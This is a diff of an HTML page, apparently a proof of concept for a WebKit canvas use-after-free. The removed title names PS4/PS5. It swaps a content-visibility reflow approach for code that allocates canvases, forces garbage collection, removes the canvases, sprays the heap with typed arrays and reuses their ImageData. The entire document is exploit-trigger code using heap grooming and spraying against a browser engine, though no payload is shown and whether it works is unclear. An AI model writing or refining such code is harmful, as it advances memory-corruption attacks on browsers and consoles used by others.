@@ -1,62 +1,70 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Heap UAF - PS WebKit Test</title>
+  <title>WebKit UAF Crash Test</title>
   <style>
-    #target {
-      content-visibility: auto;
-    }
+    body { background: #000; color: #0f0; font-family: monospace; }
   </style>
 </head>
 <body>
-  <h1>PoC - WebKit UAF Canvas (PS4/PS5)</h1>
-  <div id="target">
-    <canvas id="crashCanvas" width="256" height="256"></canvas>
-  </div>
-
+  <h1>Testing WebKit UAF...</h1>
   <script>
-    const canvas = document.getElementById('crashCanvas');
-    const ctx = canvas.getContext('2d');
+    const canvases = [];
+    const data = [];
 
-    function stress() {
-      const target = document.getElementById('target');
-
-      // Step 1: Draw into canvas and store buffer
+    function allocCanvas(i) {
+      const c = document.createElement("canvas");
+      c.width = 256;
+      c.height = 256;
+      const ctx = c.getContext("2d");
+      ctx.fillStyle = "red";
       ctx.fillRect(0, 0, 256, 256);
-      const imageData = ctx.getImageData(0, 0, 256, 256);
+      canvases.push(c);
+      data.push(ctx.getImageData(0, 0, 256, 256));
+    }
 
-      // Step 2: Manipulate content-visibility and force DOM reflow
-      target.style.contentVisibility = 'hidden';
-      target.offsetHeight; // Force reflow
+    function sprayHeap() {
+      let spray = [];
+      for (let i = 0; i < 10000; i++) {
+        spray.push(new Uint32Array(100));
+      }
+      return spray;
+    }
 
-      // Step 3: Remove canvas
-      target.innerHTML = '';
+    function triggerUAF() {
+      let container = document.createElement("div");
+      document.body.appendChild(container);
 
-      // Step 4: Attempt to use after free
-      try {
-        ctx.putImageData(imageData, 0, 0);
-        console.log('putImageData completed.');
-      } catch (e) {
-        console.log('Exception during putImageData:', e);
+      for (let i = 0; i < 100; i++) {
+        allocCanvas(i);
+        container.appendChild(canvases[i]);
       }
 
-      // Optional: Re-add canvas and repeat
-      const newCanvas = document.createElement('canvas');
-      newCanvas.width = 256;
-      newCanvas.height = 256;
-      newCanvas.getContext('2d').fillRect(0, 0, 10, 10);
-      target.appendChild(newCanvas);
+      // Trigger GC
+      for (let i = 0; i < 1000; i++) {
+        new Array(1000).fill(i.toString());
+      }
 
-      setTimeout(stress, 50);
+      // Remove canvases
+      container.innerHTML = "";
+      console.log("[+] Canvases removed");
+
+      let spray = sprayHeap();
+
+      // Try reuse imageData
+      for (let i = 0; i < 100; i++) {
+        try {
+          let ctx = canvases[i].getContext("2d");
+          ctx.putImageData(data[i], 0, 0);
+        } catch (e) {
+          console.log("[-] Exception:", e.message);
+        }
+      }
+
+      console.log("[+] Done. If browser didn't crash, check logs.");
     }
 
-    // Heap grooming
-    let arr = [];
-    for (let i = 0; i < 10000; i++) {
-      arr.push(new Array(1000).fill(0x41));
-    }
-
-    setTimeout(stress, 500);
+    setTimeout(triggerUAF, 1000);
   </script>
 </body>
 </html>
